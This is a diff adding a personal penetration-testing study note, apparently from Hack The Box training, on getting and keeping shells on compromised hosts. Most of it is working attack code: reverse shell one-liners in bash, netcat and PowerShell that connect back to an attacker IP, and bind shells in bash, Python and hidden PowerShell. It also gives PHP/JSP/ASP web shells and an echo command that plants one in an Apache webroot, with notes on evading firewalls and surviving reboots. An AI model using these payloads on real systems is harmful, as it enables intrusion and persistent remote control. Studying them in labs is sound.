@@ -1,0 +1,99 @@
+When you break into a system, you don't want to keep reexploiting
+
+So you need to crack a shell so that you have direct access to a terminal to do your work.
+
+
+3 types of shells:
+
+- Reverse Shell: Connects back to our system and gives us control through a reverse connection. 
+    - Quickest and easiest, start a netcat listener on your machine for a specific port, then open that port on the target machine.
+
+    - Step 1: Find our own systems IP to specifiy what port the listener should connect to
+        - ip a
+        - Looking for tun0 on HTB, but in the real world connected to an ethernet connection, you'll probably look for eth0
+
+    - Step 2: Open netcat listener on a port of your choosing:
+        - nc -lvnp [port]" example: "nc -lvnp 1234
+        - flags: -l -> Listen mode, wait for a connection, -v -> Verbose mode, let us know when we receive a connection -n Disable DNS resolution and only connect with IPs, speeds up connection, -p [port] -> specifies the port.
+
+    - Step 3: Execute the command:
+        - Command you execute depends on the OS of the compromised host
+        - Can utilize: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/ to find commands for specific instances that aren't covered below.
+        - Bash (Linux) -> bash -c 'bash -i >& /dev/tcp/[ip]/[port specified above] 0>&1'
+        - Bash 2 -> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+        - Powershell (Windows) -> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+
+        You can execute one of these commands on the remote host that you have access to either through a Metasploit module, or a python exploit, or something similar. 
+        When you do, you'll recieve a ping on our netcat listener, and then you can type directly into their shell.
+
+
+- Bind Shell: 
+    - Unlike a reverse shell, WE connect to it on a specific port on their machine.
+    - Step 1: Start a listening port on the remote host machine with IP '0.0.0.0' so it can be connected to from anywhere
+        - nc -lvnp [port]" example: "nc -lvnp 1234
+
+    - Step 2: Run a one of these bind shell commands:
+        - Bash (Linux) -> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+        - Python -> python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+        - Powershell (Windows) -> powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+
+    - Step 3: Once you run the command, you should have a shell waiting for you on that port that you can connect to on your machine.
+        - nc [ip] [port] example: nc 10.10.10.1 1234
+
+
+
+    Upgrading TTY:
+    - Once you connect through Netcat either with a Bind Shell or Reverse Shell, you can't move your cursor left or right to edit your comment, or see history, only execute commands, write, and backspace. To do the rest, you need to upgrade our TTY. 
+    - This can be achieved by mapping our terminal TTY with the remote TTY
+    - Multiple ways to do this, but we'll use python/stty
+    - Step 1: In OUR netcat shell, use the following command: python -c 'import pty; pty.spawn("/bin/bash")'
+
+    - Step 2: hit ctrl+z to background our shell and get back on our local terminal, and input the following command:
+        - stty raw -echo
+        - fg (brings our netcat shell back to the foreground so we can type on their host again)
+
+    - Step 3: At this point the terminal should show a blank line. Hit enter again to get back to our shell, or input "reset" and hit enter to bring it back. 
+
+    - Bonus: To make their shell look and function more like ours, open up a brand new terminal on our machine, and type:
+        -echo $TERM
+        -stty size
+
+        Then go back to our netcat shell, and type:
+        - export TERM=(whatever popped up after first command)
+        - stty rows (first number) columns (second number)
+
+
+- Web Shell
+    - Final type of shell, a web script (PHP or ASPX) that accepts our command through GET and POST request parameters, executes our command, and prints its output to the webpage. 
+
+    - Step 1: Common commands for some comon web languages:
+        - php -> <?php system($_REQUEST["cmd"]); ?>
+        - jsp -> <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+        - asp -> <% eval request("cmd") %>
+
+    Step 2: Once you HAVE our webshell, you have to put the script into the remote hosts web directory (webroot) to execute that script through the web browser
+        - This could be through a vulnerability in an upload feature, to where you can write one of our shells to a file, and upload it, then access our uploaded file to execute commands
+        - However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot. 
+        - Need to identify where the webroot is:
+
+        - Common default locations for different webservers:
+        - Apache -> /var/www/html/
+        - Nginx -> /usr/local/nginx/html/
+        - IIS -> c:\inetpub\wwwroot\
+        - XAMPP -> C:\xampp\htdocs\
+
+        We can check these directories and then use echo to write out our webshell. For example: If you were attacking a LINUX host running APACHE, you could hit a PHP shell with the following -> echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+
+    Step 3: Once we write our webshell, we can access it through either a browser, or cURL. You can visit shell.php on the compromised website and use ?cmd=id to execute the id command
+
+    ex: http://SERVER_IP:PORT/shell.php?cmd=id
+
+    another option would be to use cURL-> curl http://SERVER_IP:PORT/shell.php?cmd=id
+
+
+
+    The big benefit of web shell is that it bypasses firewall restrictions as it runs on either port 80/443 instead of making a new port, or whichever port the server is running on. 
+    Another benefit is if the ccompromised host is rebooted, the web shell would still be in place and we can access it and get command execution without exploiting the host again.
+
+    The downside is that it's not as interactive since you need to keep sending new URLs to execute commands.
+    
